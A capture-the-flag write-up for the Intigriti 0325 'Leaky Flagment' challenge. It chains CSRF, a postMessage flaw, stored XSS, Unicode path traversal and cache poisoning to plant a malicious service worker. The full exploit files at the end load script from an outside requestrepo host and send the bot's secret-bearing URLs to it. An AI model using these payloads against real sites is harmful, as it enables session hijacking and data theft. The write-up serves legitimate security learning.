# Intigriti XSS challenge 0325 - Leaky Flagment
Tags: #xss #csrf #unicode #path-traversal #cache #service-worker #fragment-directive

## Overview
The app is composed by 3 services:
- The main app is built with `next.js 15.1.5`, and has only a create note functionality.
- There's a bot that opens submitted urls
- Redis is used as database

## Road to flag
The flag is used by the bot as password to log in:
```js
await driver.executeScript(async (flag) => {
	const response = await fetch("/api/auth", {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
		},
		body: JSON.stringify({
			username: "admin" + Math.floor(Math.random() * 10000000),
			password: flag
		}),
	});
```
And then it is stored in the `secret` cookie:

`/api/auth`
```js
const redisKey = "nextjs:"+btoa(`${username}:${password}`);
const userExists = await redis.get(redisKey);
if (userExists) {
	res.setHeader("Set-Cookie", `secret=${redisKey.replace('nextjs:', '')}; ${cookieOptions}`);
	return res.status(200).json({ message: "Cookie set successfully" });
}
```

The cookie is set as **httponly**, so can't be stolen directly:
```js
const cookieOptions = [`HttpOnly`,`Secure`,`Max-Age=${60 * 60}`,`SameSite=None`,`Path=/`,process.env.DOMAIN && `Domain=${process.env.DOMAIN}`]
```

- `middleware.js`
  
If the query parameter `s` is not present in the request to `/note/id`, the **middleware** rewrites the url adding `?s=true` and `:~:${secret_cookie}` to the url **fragment** (so we have the flag in the fragment).
```js
if (path.startsWith('/note/') && !request.nextUrl.searchParams.has('s')) {
    let secret_cookie = '';
    try {
      secret_cookie = atob(request.cookies.get('secret')?.value);
    } catch (e) {
      secret_cookie = '';
    }
    const secretRegex = /^[a-zA-Z0-9]{3,32}:[a-zA-Z0-9!@#$%^&*()\-_=+{}.]{3,64}$/;
    const newUrl = request.nextUrl.clone();
    if (!secret_cookie || !secretRegex.test(secret_cookie)) {
      return NextResponse.next();
    }
    newUrl.searchParams.set('s', 'true');
    newUrl.hash = `:~:${secret_cookie}`;
    return NextResponse.redirect(newUrl, 302);
  }
```

But what is `:~:`?

It is a [fragment directive delimiter](https://wicg.github.io/scroll-to-text-fragment/#the-fragment-directive). The scroll to text fragment is a directive that tells the browser to highlight and scroll to a matching text in the page.
It is part of the url fragment and its content is not accessible to javascript, as explained by the [RFC](https://wicg.github.io/scroll-to-text-fragment/#extracting-the-fragment-directive:~:text=Session%20history%20entries%20now%20include%20a%20new%20%22directive%20state%22%20item):
   > The fragment directive is removed from the URL before the URL is set to the session history entry. It is instead stored in the directive state. This prevents it from being visible to script APIs so that a directive can be specified without interfering with a page’s operation.
 
Another problem is that `:~:user:pass` is not a valid directive, it should be `:~:text=match` to be applied by the browser -> https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment/Text_fragments#syntax.
So [XS Leak](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/) using CSS and the selector `:target::before` is not directly possible in this case.

## Code review
### Bot
The bot, after opening the submitted url, clicks in the center of the page:
```js
await driver.get(url);
    await driver.wait(async () => {
      return (await driver.executeScript('return document.readyState')) === 'complete';
    }, timeout);

    const viewportSize = await driver.executeScript(() => {
      return {
        width: window.innerWidth,
        height: window.innerHeight,
      };
    });

    const centerX = Math.floor(viewportSize.width / 2);
    const centerY = Math.floor(viewportSize.height / 2);

    const actions = driver.actions();
    await actions.move({ x: centerX, y: centerY }).click().perform();
    console.log(`Clicking at center: (${centerX}, ${centerY})`);
```

This allows clickjacking and to open popup windows from an attacker page.
### App - Frontend

- xss in `/note/[id]` due to the use of `dangerouslySetInnerHTML`
```jsx
<CardContent className="flex-1 pt-6 border-t border-rose-100">
	 <div className="bg-white/80 backdrop-blur-sm p-8 rounded-xl border border-rose-200 shadow-sm min-h-[400px]">
		 <div
			 className="prose max-w-none text-gray-700 whitespace-pre-wrap break-words"
			 dangerouslySetInnerHTML={{ __html: note.content }}
		 />
	 </div>
 </CardContent>
```

- `middleware.js`
  
Path traversal due to `current_url.pathname = "/note/" + note_id.normalize('NFKC');`:
`/view_protected_note?id=../43d07-54b7-45d5-9417-/../api/post` will be rewritten as `/note/../43d07-54b7-45d5-9417-/../api/post`
```js
if (path.startsWith('/view_protected_note')) {
    const query = request.nextUrl.searchParams;
    const note_id = query.get('id');
    const uuid_regex = /^[^\-]{8}-[^\-]{4}-[^\-]{4}-[^\-]{4}-[^\-]{12}$/;
    const isMatch = uuid_regex.test(note_id);
    if (note_id && isMatch) {
      const current_url = request.nextUrl.clone();
      current_url.pathname = "/note/" + note_id.normalize('NFKC');
      return NextResponse.rewrite(current_url);
    } else {
      return new NextResponse('Uh oh, Missing or Invalid Note ID :c', {
        status: 403,
        headers: { 'Content-Type': 'text/plain' },
      });
    }
  }
```
`note_id.normalize('NFKC');` could introduce other vulnerabilities due to **unicode normalization**.

- `/notes` communicates with `/protected-note` using postmessages:

`protected-note`

This page has a flawed postmessage handler: it doesn't check the origin of the sender or receiver of the message.
An attacker can exploit this to **retrieve note Ids**.
```js
useEffect(() => {
	if (window.opener) {
		window.opener.postMessage({ type: "childLoaded" }, "*");
	}
	setisMounted(true);
	const handleMessage = (event) => {
		if (event.data.type === "submitPassword") {
			validatepassword(event.data.password);
		}
	};
    window.addEventListener("message", handleMessage);
    return () => window.removeEventListener("message", handleMessage);
  }, []);

const validatepassword = (submittedpassword) => {
	const notes = JSON.parse(localStorage.getItem("notes") || "[]");
	const foundNote = notes.find((note) => note.password === submittedpassword);
	
	if (foundNote) {
		window.opener.postMessage({ type: "success", noteId: foundNote.id }, "*");
		setIsSuccess(true);
	} else {
		window.opener.postMessage({ type: "error" }, "*");
		setIsSuccess(false);
	}
};
```

#### API

- `POST /api/post` handles the creation of new notes.
```js
case "POST":
	try {
		let secret_cookie;
		// [. . .]
		const content_type = req.headers["content-type"];
		// [. . .]
		if (content_type && !content_type.startsWith("application/json")) 
			return res.status(400).json({ message: "Invalid content type" });
		// [. . .]
		if (typeof content === "string" &&    (content.includes("<") || content.includes(">"))) 
			return res.status(400).json({ message: "Invalid value for title or content" });
		// [. . .]
```

- This code has two issues:
	1. Ineffective input validation
		Blocks requests for creating notes that in the content have `<` or `>`: `if (typeof content === "string" &&    (content.includes("<") || content.includes(">"))) `
		This filter can be easily bypassed by submitting an array value to `content`: `{"title":"xxx","content":["<img src=x onerror=alert(1)>"],"use_password":"false"}`.
	2. CSRF
		The **content-type** is checked only if present: `if (content_type && !content_type.startsWith("application/json")) `
		It's possible to do CSRF attacks [without content-type](https://nastystereo.com/security/cross-site-post-without-content-type.html) using fetch and **blobs** -> ``fetch("/api/post", { method: "POST", body: new Blob([`content`]) });``
		Cookie is set as **SameSite=None** ``const cookieOptions = [`HttpOnly`,`Secure`,`Max-Age=${60 * 60}`,`SameSite=None`,`Path=/`,process.env.DOMAIN && `Domain=${process.env.DOMAIN}`]``, allowing cross-site cookie transmission.

- `/api/track` contains a clear **header-based xss**
```js
export default async function handler(req, res) {
    const { method } = req
    res.setHeader('Content-Type', 'text/javascript')
    switch (method) {
        case 'GET':
            try {
                const userIp = req.headers['x-user-ip'] || '0.0.0.0'
                const jsContent = `
$(document).ready(function() {
    const userDetails = {
        ip: "${userIp}",
        type: "client",
        timestamp: new Date().toISOString(),
        ipDetails: {}
    };
    window.ipAnalytics = {
        track: function() {
            return {
                ip: userDetails.ip,
                timestamp: new Date().toISOString(),
                type: userDetails.type,
                ipDetails: userDetails.ipDetails
            };
        }
    };
});`...
```
## Exploitation

#### 1. CSRF allows to create a note containing the XSS payload in the bot account

The `secret` cookie is set as `Samesite=None, Secure`. So it can be sent cross-origin but only for GET requests and **top-level** POST requests. For background requests CORS has to be configured due to recent [third party cookie policies](https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/Third-party_cookies#how_do_browsers_handle_third-party_cookies).

| Request Type      | Preflight Required | Credential Transmission           |
| ----------------- | ------------------ | --------------------------------- |
| GET/HEAD (Simple) | No                 | Immediate with credentials        |
| Top-level POST    | No                 | Immediate with credentials        |
| background POST   | Yes                | Conditional on preflight response |

This makes CSRF attacks difficult in this case because to create a note we need to send a POST request with an `application/json` or **empty** content-type.

I found that when there is user interaction: for example when an user clicks a button that sends a background request `<button onclick="fetch(...);">send</button>`, cookies are included even for POST requests without the need of preflight request, if the content-type is not set.

Knowing that, I can make the bot click on a button that creates a malicious note in his account:
```html
<button onclick='fetch("https://challenge-0325.intigriti.io/api/post", {method: "POST",mode: "no-cors",credentials: "include",body:`new Blob[JSON.stringify({"title": "a2","content": ["a"],"use_password": "false"})]});' style="width: 100vw; height: 100vh;">send</button>
```

Now that the malicious note has been created I need a way to know its ID:

#### 2. Retrieve the malicious noteId by exploiting the postmessage vulnerability
just send a postmessage with empty password and read the noteId from the response.
```js
window.addEventListener('message', e => {
  if (e.data.noteId) 
		// smth
});
win = window.open('https://challenge-0325.intigriti.io/protected-note', 'x');
win.postMessage({type:"submitPassword",password:""}, "*");
```

#### 3. Trigger the XSS by redirecting the bot to the malicious note
`window.open('http://chall/note/ID)`

#### 4. Leak the fragment directive
This is the most challenging part, as it is not accessible to javascript, and fetch doesn't allow access to redirects response headers (even if same-origin).
```js
res = await fetch("/note/889a756e-d8b7-42b6-8011-c0b12b636c12", {redirect:"manual"}); console.log(res)  
// Response { type: "opaqueredirect", url: "https://challenge-0325.intigriti.io/note/889a756e-d8b7-42b6-8011-c0b12b636c12", redirected: false, status: 0, ok: false, statusText: "", headers: Headers(0),
```

**Note: the bot uses Firefox. In chrome the solution would be very simple, the fragment directive can be leaked with `navigation.currentEntry.url`**

The only way remaining is by **intercepting** requests/responses in some way.

The only way known to me to do that is by using **Service Workers**, that are essentially **proxies** that sit between web applications, the browser, and the network. Their purpose is intercepting, modifying and caching requests/responses.

The problem is that to register one I need a **javascript file** containing the worker's code hosted on the **same origin**. And since there are no file upload functionalities, creating these requisites isn't the easiest task.

I need an endpoint where I can inject code that returns `application/javascript`. 
The only one with these requirements is `/api/track`, where I can inject code via the `x-user-ip` header.
But there's no way to load a service worker specifying a custom header, so I must have the script cached and loaded by `navigator.serviceWorker.register` in some way.


**Exploiting the path traversal + unicode normalization**
Service workers have a **scope**: The scope of a service worker represents a URL pattern that determines where the service worker has authority. When a user navigates to a page, the browser checks if any registered service worker's scope matches the page's URL.
By default, a service worker's scope is determined by its location on the web server:
- A service worker at `/subdir/sw.js` has a scope of `/subdir/` and can only control pages within that directory

So caching the script at `/api/track` would be useless because the sw scope would be `/api`.

Here the route `/view_protected_note` comes into play, it's possible to make a path traversal so that the url gets rewritten as `/api/track` like that:
`/view_protected_note?id=../d8d34-16c0-432d-9be2-/\u2025/api/track`

`\u2025` gets normalized to `..`, it's just to make the `?id` param a valid uuid to this regex `const uuid_regex = /^[^\-]{8}-[^\-]{4}-[^\-]{4}-[^\-]{4}-[^\-]{12}$/;`

**Caching the poisoned script in the browser and loading as Service Worker**

In `next.config.js`, it's possible to see that for urls ending in **.js**, cache headers are set.
```js
{
        source: '/:path*.js',
        headers: [
          {
            key: 'Cache-Control',
            value: 'public, max-age=120, immutable',
          },
        ],
      }
```
So I can make a request to `/view_protected_note.js?id=../d8d34-16c0-432d-9be2-/\u2025/api/track` in order to cache thee script in the browser.

Then I can use this cached script to register a service worker.
But the sw **registration bypasses cache**. Solution: [updateViaCache](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/updateViaCache)

Service workers can be updated by specifyng the `updateViaCache` property in its options.

Then to load a malicious service worker I can just:

register the sw -> poison the cache -> update the sw


**Making a valid service worker - Hoisting**
The response from `/api/track` endpoint contains code using jQuery (`$(document).ready`), and also refers to `window` and `document` global objects, which will **not be defined** in the global scope of the Service Worker:
```js
$(document).ready(function() {
    const userDetails = {
        ip: "${userIp}",
        type: "client",
        timestamp: new Date().toISOString(),
        ipDetails: {}
    };
```
To avoid this problem, I can use [hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting). In JavaScript, variables and functions can be used before declaration. So I can just define `$` and `document` anywhere in the script.

**Flag**
`INTIGRITI{s3rv1ce_w0rk3rs_4re_p0w3rful}`


## Full exploit

`exploit.html` - csrf + leaking the noteid with the insecure postmessage
```html
<button onclick="csrf();" style="width: 100vw; height: 100vh">send</button>

<script>
    const chall_url = "https://challenge-0325.intigriti.io";
    let noteId = null;
    const payload = ``
    const xss = `<script src='https://cc426f7n.requestrepo.com/expl.js'>\x3cscript>`;

    function csrf() {
        fetch(`${chall_url}/api/post`, {
            method: "POST",
            mode: "no-cors",
            credentials: "include",
            body: new Blob([`{"title": "exploit","content": ["${xss}"],"use_password": "false"}`], { type: "" }),
        });
        setTimeout(() => {
            win = window.open(`${chall_url}/protected-note`, 'x');
            setTimeout(() => {
                win.postMessage({type:"submitPassword",password:""}, "*");
            }, 500);
        }, 500);
    }


    window.addEventListener('message', e => {
        console.log(e.data);
        if (e.data.noteId) {
            noteId = e.data.noteId;
            open(`${chall_url}/note/${e.data.noteId}`);
        }
    });
</script>

```

`expl.js` - poisoning the local cache and loading the malicious Service Worker
```js
webhook_url = "https://cc426f7n.requestrepo.com";
inj = "\"}}); INJECTION (function(){let x = {x:\"";
sw = "var document;function $(){return{ready:()=>{}}};const s=':~:',b='//cc426f7n.requestrepo.com';self.addEventListener('install',e=>{console.log('Service Worker: Installing...');e.waitUntil(self.skipWaiting())});self.addEventListener('activate',e=>{console.log('Service Worker: Activating...');e.waitUntil(self.clients.claim())});self.addEventListener('fetch',e=>{const r=e.request.url;let f=!1,t='',v='';if(r.includes(s)){f=!0;t='request_url';v=r}e.respondWith(fetch(e.request).then(n=>{const c=n.clone(),u=c.url,l=c.headers.get('Location');if(!f&&u.includes(s)){f=!0;t='response_url';v=u}if(!f&&l&&l.includes(s)){f=!0;t='location_header';v=l}if(f){try{fetch(b,{method:'POST',body:JSON.stringify({triggerReason:t,triggerValue:v,original_request_url:r})})}catch(e){console.error('SW: Failed to send beacon:',e)}}return n}).catch(e=>{console.error('SW: Fetch failed:',e);throw e}))});";
sw_header = inj.replace("INJECTION", sw);
sw_url = "/view_protected_note.js?id=../d8d34-16c0-432d-9be2-/\u2025/api/track";
headers = {
  "X-User-Ip": sw_header,
  "Sec-Fetch-Dest": "serviceworker",
  "Service-Worker": "script",
  "Cache-Control": "max-age=1800",
  "Priority": "u=4",
};

function poison() {
  console.log("poisoning");
  return fetch(sw_url, {
    mode: "same-origin",
    cache: "reload",
    headers: {
      ...headers,
    },
  });
}

function register() {
  return navigator.serviceWorker.register(sw_url, { scope: "/", type: "module", updateViaCache: "all" })
}

function update() {
  navigator.serviceWorker.getRegistration().then((reg) => {
    console.log("updating", reg);
    if (reg)
      reg.update();
  });
}

register().then(() => {
  setTimeout(() => {
    poison().then(() => {
      update()
      setTimeout(() => {
        console.log("poisoned")
        location = location.pathname+"?x=1"
      }, 2000)
    })
  }, 2000)
});
```

`sw.js`
```js
var document;
function $() {
  return {
    ready: () => {}
  }
};

const SPECIAL_STRING = ':~:';
const BEACON_ENDPOINT = '//cc426f7n.requestrepo.com';

self.addEventListener('install', (event) => {
  console.log('Service Worker: Installing...');
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
  console.log('Service Worker: Activating...');
  event.waitUntil(self.clients.claim());
});


self.addEventListener('fetch', (event) => {
  const requestUrl = event.request.url;
  let shouldSendBeacon = false;
  let triggerReason = '';
  let triggerValue = '';

  if (requestUrl.includes(SPECIAL_STRING)) {
    shouldSendBeacon = true;
    triggerReason = 'request_url';
    triggerValue = requestUrl;
  }

  event.respondWith(
    fetch(event.request)
      .then(response => {
        const responseClone = response.clone();

        const responseUrl = responseClone.url;
        const locationHeader = responseClone.headers.get('Location');

        if (!shouldSendBeacon && responseUrl.includes(SPECIAL_STRING)) {
          shouldSendBeacon = true;
          triggerReason = 'response_url';
          triggerValue = responseUrl;
        }

        if (!shouldSendBeacon && locationHeader && locationHeader.includes(SPECIAL_STRING)) {
          shouldSendBeacon = true;
          triggerReason = 'location_header';
          triggerValue = locationHeader;
        }
        
        if (shouldSendBeacon) {
          try {
            fetch(BEACON_ENDPOINT, {
              method: 'POST',
              body: JSON.stringify({triggerReason,triggerValue,original_request_url:requestUrl})
            });
          } catch (e) {
            console.error('SW: Failed to send beacon:', e);
          }
        }

        return response;
      })
      .catch(error => {
        console.error('SW: Fetch failed:', error);
        throw error;
      })
  );
});
```